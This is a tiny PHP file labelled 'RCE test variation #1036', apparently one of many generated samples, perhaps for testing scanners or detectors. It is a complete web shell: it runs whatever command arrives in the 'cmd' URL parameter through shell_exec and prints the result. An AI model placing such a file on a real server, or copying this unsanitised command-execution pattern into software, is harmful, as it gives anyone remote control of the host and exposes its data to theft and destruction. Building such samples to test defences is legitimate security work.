<?php
// RCE test variation #1036
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>